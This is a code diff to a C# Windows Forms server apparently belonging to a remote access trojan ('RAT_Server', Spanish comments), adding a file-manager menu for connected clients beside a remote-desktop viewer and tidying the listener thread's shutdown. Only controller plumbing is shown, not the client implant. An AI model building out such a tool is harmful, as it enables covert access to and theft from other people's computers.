@@ -11,6 +11,8 @@ namespace RAT_Server
     public partial class ServerForm : Form
     {
         private TcpListener server;
+        private Thread acceptThread;
+        private volatile bool serverRunning;
         private Dictionary<string, TcpClient> connectedClients = new Dictionary<string, TcpClient>();
         private ContextMenuStrip contextMenu; // Declarar el ContextMenuStrip aquí
         private object clientLock = new object();
@@ -28,8 +30,12 @@ namespace RAT_Server
             var menuRemoteDesktop = new ToolStripMenuItem("Ver Escritorio Remoto");
             menuRemoteDesktop.Click += menuRemoteDesktop_Click;
 
+            var menuFileManager = new ToolStripMenuItem("Administrador de Archivos");
+            menuFileManager.Click += menuFileManager_Click;
+
             // Puedes agregar más opciones al menú aquí
             contextMenu.Items.Add(menuRemoteDesktop);
+            contextMenu.Items.Add(menuFileManager);
         }
 
         private void ServerForm_Load(object sender, EventArgs e)
@@ -43,9 +49,12 @@ namespace RAT_Server
             {
                 server = new TcpListener(IPAddress.Any, port);
                 server.Start();
+                serverRunning = true;
                 AppendLog($"Servidor iniciado en el puerto {port}...");
-                Thread acceptThread = new Thread(AcceptClients);
-                acceptThread.IsBackground = true;
+                acceptThread = new Thread(AcceptClients)
+                {
+                    IsBackground = true
+                };
                 acceptThread.Start();
             }
             catch (Exception ex)
@@ -60,7 +69,13 @@ namespace RAT_Server
             {
                 if (server != null)
                 {
+                    serverRunning = false;
                     server.Stop();
+                    server = null;
+                    if (acceptThread != null && acceptThread.IsAlive)
+                    {
+                        acceptThread.Join();
+                    }
                     AppendLog("Servidor detenido.");
                 }
             }
@@ -72,14 +87,24 @@ namespace RAT_Server
 
         private void AcceptClients()
         {
-            while (true)
+            while (serverRunning)
             {
                 try
                 {
                     var client = server.AcceptTcpClient();
-                    Thread clientThread = new Thread(() => HandleClient(client));
-                    clientThread.IsBackground = true;
+                    Thread clientThread = new Thread(() => HandleClient(client))
+                    {
+                        IsBackground = true
+                    };
                     clientThread.Start();
+                }
+                catch (ObjectDisposedException)
+                {
+                    break; // El servidor se detuvo
+                }
+                catch (SocketException) when (!serverRunning)
+                {
+                    break;
                 }
                 catch (Exception ex)
                 {
@@ -217,6 +242,24 @@ namespace RAT_Server
                     TcpClient client = connectedClients[clientName];
                     var remoteDesktopForm = new RemoteDesktopForm(client);
                     remoteDesktopForm.Show();
+                }
+                else
+                {
+                    MessageBox.Show("El cliente ya no está conectado.");
+                }
+            }
+        }
+
+        private void menuFileManager_Click(object sender, EventArgs e)
+        {
+            if (listViewClients.SelectedItems.Count > 0)
+            {
+                string clientName = listViewClients.SelectedItems[0].Text;
+                if (connectedClients.ContainsKey(clientName))
+                {
+                    TcpClient client = connectedClients[clientName];
+                    var fm = new FileManagerForm(client);
+                    fm.Show();
                 }
                 else
                 {
